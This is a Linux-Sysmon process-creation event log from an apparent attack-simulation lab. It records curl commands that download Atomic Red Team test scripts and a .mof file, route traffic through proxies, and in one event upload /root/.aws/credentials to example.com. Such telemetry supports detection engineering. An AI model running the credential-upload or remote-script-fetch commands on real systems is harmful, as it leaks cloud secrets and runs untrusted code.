<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-07-29T16:41:18.732243000Z"/><EventRecordID>94451336</EventRecordID><Correlation/><Execution ProcessID="4770" ThreadID="4770"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-mhaag-attack-range-8786</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-07-29 16:41:18.735</Data><Data Name="ProcessGuid">{ec28c72e-0dae-62e4-783d-510aac550000}</Data><Data Name="ProcessId">23380</Data><Data Name="Image">/usr/bin/curl</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">curl -sO https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh</Data><Data Name="CurrentDirectory">/home/ubuntu</Data><Data Name="User">root</Data><Data Name="LogonGuid">{ec28c72e-0000-0000-0000-000000000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">751</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{ec28c72e-edb1-62e3-4884-14ef6f550000}</Data><Data Name="ParentProcessId">23094</Data><Data Name="ParentImage">/bin/bash</Data><Data Name="ParentCommandLine">bash</Data><Data Name="ParentUser">root</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-07-29T16:41:12.554612000Z"/><EventRecordID>94451087</EventRecordID><Correlation/><Execution ProcessID="4770" ThreadID="4770"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-mhaag-attack-range-8786</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-07-29 16:41:12.557</Data><Data Name="ProcessGuid">{ec28c72e-0da8-62e4-786d-7af9c4550000}</Data><Data Name="ProcessId">23376</Data><Data Name="Image">/usr/bin/curl</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">curl -sO https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh</Data><Data Name="CurrentDirectory">/home/ubuntu</Data><Data Name="User">root</Data><Data Name="LogonGuid">{ec28c72e-0000-0000-0000-000000000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">751</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{ec28c72e-edb1-62e3-4884-14ef6f550000}</Data><Data Name="ParentProcessId">23094</Data><Data Name="ParentImage">/bin/bash</Data><Data Name="ParentCommandLine">bash</Data><Data Name="ParentUser">root</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-07-29T16:40:28.936504000Z"/><EventRecordID>94450692</EventRecordID><Correlation/><Execution ProcessID="4770" ThreadID="4770"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-mhaag-attack-range-8786</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-07-29 16:40:28.938</Data><Data Name="ProcessGuid">{ec28c72e-0d7c-62e4-781d-9d4866550000}</Data><Data Name="ProcessId">23371</Data><Data Name="Image">/usr/bin/curl</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh</Data><Data Name="CurrentDirectory">/home/ubuntu</Data><Data Name="User">root</Data><Data Name="LogonGuid">{ec28c72e-0000-0000-0000-000000000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">751</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{ec28c72e-edb1-62e3-4884-14ef6f550000}</Data><Data Name="ParentProcessId">23094</Data><Data Name="ParentImage">/bin/bash</Data><Data Name="ParentCommandLine">bash</Data><Data Name="ParentUser">root</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-07-29T16:40:12.062239000Z"/><EventRecordID>94449712</EventRecordID><Correlation/><Execution ProcessID="4770" ThreadID="4770"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-mhaag-attack-range-8786</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-07-29 16:40:12.064</Data><Data Name="ProcessGuid">{ec28c72e-0d6c-62e4-785d-9178f3550000}</Data><Data Name="ProcessId">23365</Data><Data Name="Image">/usr/bin/curl</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh</Data><Data Name="CurrentDirectory">/home/ubuntu</Data><Data Name="User">root</Data><Data Name="LogonGuid">{ec28c72e-0000-0000-0000-000000000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">751</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{ec28c72e-edb1-62e3-4884-14ef6f550000}</Data><Data Name="ParentProcessId">23094</Data><Data Name="ParentImage">/bin/bash</Data><Data Name="ParentCommandLine">bash</Data><Data Name="ParentUser">root</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-07-29T16:38:24.309143000Z"/><EventRecordID>94447472</EventRecordID><Correlation/><Execution ProcessID="4770" ThreadID="4770"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-mhaag-attack-range-8786</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-07-29 16:38:24.312</Data><Data Name="ProcessGuid">{ec28c72e-0d00-62e4-784d-26e689550000}</Data><Data Name="ProcessId">23356</Data><Data Name="Image">/usr/bin/curl</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">curl -sO https://gist.githubusercontent.com/MHaggis/b7fe00e3f4b12de4dc302ad3b0a9b26f/raw/5f6b35cce55d038403bbc38272f45853ea42c390/test.mof /tmp/test.mof</Data><Data Name="CurrentDirectory">/home/ubuntu</Data><Data Name="User">root</Data><Data Name="LogonGuid">{ec28c72e-0000-0000-0000-000000000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">751</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{ec28c72e-edb1-62e3-4884-14ef6f550000}</Data><Data Name="ParentProcessId">23094</Data><Data Name="ParentImage">/bin/bash</Data><Data Name="ParentCommandLine">bash</Data><Data Name="ParentUser">root</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-07-29T16:38:15.344068000Z"/><EventRecordID>94447215</EventRecordID><Correlation/><Execution ProcessID="4770" ThreadID="4770"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-mhaag-attack-range-8786</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-07-29 16:38:15.347</Data><Data Name="ProcessGuid">{ec28c72e-0cf7-62e4-78ed-32828d550000}</Data><Data Name="ProcessId">23352</Data><Data Name="Image">/usr/bin/curl</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">curl -sO https://gist.githubusercontent.com/MHaggis/b7fe00e3f4b12de4dc302ad3b0a9b26f/raw/5f6b35cce55d038403bbc38272f45853ea42c390/test.mof /tmp/</Data><Data Name="CurrentDirectory">/home/ubuntu</Data><Data Name="User">root</Data><Data Name="LogonGuid">{ec28c72e-0000-0000-0000-000000000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">751</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{ec28c72e-edb1-62e3-4884-14ef6f550000}</Data><Data Name="ParentProcessId">23094</Data><Data Name="ParentImage">/bin/bash</Data><Data Name="ParentCommandLine">bash</Data><Data Name="ParentUser">root</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-07-29T16:36:24.575548000Z"/><EventRecordID>94443619</EventRecordID><Correlation/><Execution ProcessID="4770" ThreadID="4770"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-mhaag-attack-range-8786</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-07-29 16:36:24.578</Data><Data Name="ProcessGuid">{ec28c72e-0c88-62e4-78cd-bc06f4550000}</Data><Data Name="ProcessId">23333</Data><Data Name="Image">/usr/bin/curl</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">curl -sO https://gist.githubusercontent.com/MHaggis/b7fe00e3f4b12de4dc302ad3b0a9b26f/raw/5f6b35cce55d038403bbc38272f45853ea42c390/test.mof</Data><Data Name="CurrentDirectory">/home/ubuntu</Data><Data Name="User">root</Data><Data Name="LogonGuid">{ec28c72e-0000-0000-0000-000000000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">751</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{ec28c72e-edb1-62e3-4884-14ef6f550000}</Data><Data Name="ParentProcessId">23094</Data><Data Name="ParentImage">/bin/bash</Data><Data Name="ParentCommandLine">bash</Data><Data Name="ParentUser">root</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-07-29T16:36:19.614720000Z"/><EventRecordID>94443235</EventRecordID><Correlation/><Execution ProcessID="4770" ThreadID="4770"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-mhaag-attack-range-8786</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-07-29 16:36:19.617</Data><Data Name="ProcessGuid">{ec28c72e-0c83-62e4-78fd-420057550000}</Data><Data Name="ProcessId">23312</Data><Data Name="Image">/usr/bin/curl</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">curl -sO https://gist.githubusercontent.com/MHaggis/b7fe00e3f4b12de4dc302ad3b0a9b26f/raw/5f6b35cce55d038403bbc38272f45853ea42c390/test.mof</Data><Data Name="CurrentDirectory">/home/ubuntu</Data><Data Name="User">root</Data><Data Name="LogonGuid">{ec28c72e-0000-0000-0000-000000000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">751</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{ec28c72e-edb1-62e3-4884-14ef6f550000}</Data><Data Name="ParentProcessId">23094</Data><Data Name="ParentImage">/bin/bash</Data><Data Name="ParentCommandLine">bash</Data><Data Name="ParentUser">root</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-07-29T14:27:06.973460000Z"/><EventRecordID>94131062</EventRecordID><Correlation/><Execution ProcessID="4770" ThreadID="4770"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-mhaag-attack-range-8786</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-07-29 14:27:06.976</Data><Data Name="ProcessGuid">{ec28c72e-ee3a-62e3-789d-16e148560000}</Data><Data Name="ProcessId">23112</Data><Data Name="Image">/usr/bin/curl</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">curl -sO https://gist.githubusercontent.com/MHaggis/b7fe00e3f4b12de4dc302ad3b0a9b26f/raw/5f6b35cce55d038403bbc38272f45853ea42c390/test.mof</Data><Data Name="CurrentDirectory">/home/ubuntu</Data><Data Name="User">root</Data><Data Name="LogonGuid">{ec28c72e-0000-0000-0000-000000000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">751</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{ec28c72e-edb1-62e3-4884-14ef6f550000}</Data><Data Name="ParentProcessId">23094</Data><Data Name="ParentImage">/bin/bash</Data><Data Name="ParentCommandLine">bash</Data><Data Name="ParentUser">root</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-07-29T14:26:17.350250000Z"/><EventRecordID>94128420</EventRecordID><Correlation/><Execution ProcessID="4770" ThreadID="4770"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-mhaag-attack-range-8786</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-07-29 14:26:17.353</Data><Data Name="ProcessGuid">{ec28c72e-ee09-62e3-78dd-38347a550000}</Data><Data Name="ProcessId">23108</Data><Data Name="Image">/usr/bin/curl</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">curl -sO https://gist.githubusercontent.com/MHaggis/b7fe00e3f4b12de4dc302ad3b0a9b26f/raw/5f6b35cce55d038403bbc38272f45853ea42c390/test.mofhttps://gist.githubusercontent.com/MHaggis/b7fe00e3f4b12de4dc302ad3b0a9b26f/raw/5f6b35cce55d038403bbc38272f45853ea42c390/test.mof</Data><Data Name="CurrentDirectory">/home/ubuntu</Data><Data Name="User">root</Data><Data Name="LogonGuid">{ec28c72e-0000-0000-0000-000000000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">751</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{ec28c72e-edb1-62e3-4884-14ef6f550000}</Data><Data Name="ParentProcessId">23094</Data><Data Name="ParentImage">/bin/bash</Data><Data Name="ParentCommandLine">bash</Data><Data Name="ParentUser">root</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-07-29T12:06:55.219583000Z"/><EventRecordID>93804932</EventRecordID><Correlation/><Execution ProcessID="4770" ThreadID="4770"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-mhaag-attack-range-8786</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-07-29 12:06:55.222</Data><Data Name="ProcessGuid">{ec28c72e-cd5f-62e3-78cd-b3690d560000}</Data><Data Name="ProcessId">22871</Data><Data Name="Image">/usr/bin/curl</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">curl --preproxy socks5://proxy.example -x http://http.example https://example.com</Data><Data Name="CurrentDirectory">/home/ubuntu</Data><Data Name="User">ubuntu</Data><Data Name="LogonGuid">{ec28c72e-caa1-62e3-e803-000000000000}</Data><Data Name="LogonId">1000</Data><Data Name="TerminalSessionId">751</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{ec28c72e-caa1-62e3-48c4-b8cb06560000}</Data><Data Name="ParentProcessId">22840</Data><Data Name="ParentImage">/bin/bash</Data><Data Name="ParentCommandLine">-bash</Data><Data Name="ParentUser">ubuntu</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-07-29T12:06:54.254319000Z"/><EventRecordID>93804846</EventRecordID><Correlation/><Execution ProcessID="4770" ThreadID="4770"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-mhaag-attack-range-8786</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-07-29 12:06:54.257</Data><Data Name="ProcessGuid">{ec28c72e-cd5e-62e3-785d-93e58d550000}</Data><Data Name="ProcessId">22870</Data><Data Name="Image">/usr/bin/curl</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">curl -x http://user:pwd@ curl --preproxy socks5://proxy.example -x http://http.example https://example.com127.0.0.1:1234 http://httpbin.org/ip</Data><Data Name="CurrentDirectory">/home/ubuntu</Data><Data Name="User">ubuntu</Data><Data Name="LogonGuid">{ec28c72e-caa1-62e3-e803-000000000000}</Data><Data Name="LogonId">1000</Data><Data Name="TerminalSessionId">751</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{ec28c72e-caa1-62e3-48c4-b8cb06560000}</Data><Data Name="ParentProcessId">22840</Data><Data Name="ParentImage">/bin/bash</Data><Data Name="ParentCommandLine">-bash</Data><Data Name="ParentUser">ubuntu</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-07-29T12:34:50.380245000Z"/><EventRecordID>93868841</EventRecordID><Correlation/><Execution ProcessID="4770" ThreadID="4770"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-mhaag-attack-range-8786</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-07-29 12:34:50.383</Data><Data Name="ProcessGuid">{ec28c72e-d3ea-62e3-782d-328196550000}</Data><Data Name="ProcessId">22917</Data><Data Name="Image">/usr/bin/curl</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">curl -F userfile=@/root/.aws/credentials http://example.com</Data><Data Name="CurrentDirectory">/home/ubuntu</Data><Data Name="User">ubuntu</Data><Data Name="LogonGuid">{ec28c72e-caa1-62e3-e803-000000000000}</Data><Data Name="LogonId">1000</Data><Data Name="TerminalSessionId">751</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{ec28c72e-caa1-62e3-48c4-b8cb06560000}</Data><Data Name="ParentProcessId">22840</Data><Data Name="ParentImage">/bin/bash</Data><Data Name="ParentCommandLine">-bash</Data><Data Name="ParentUser">ubuntu</Data></EventData></Event>
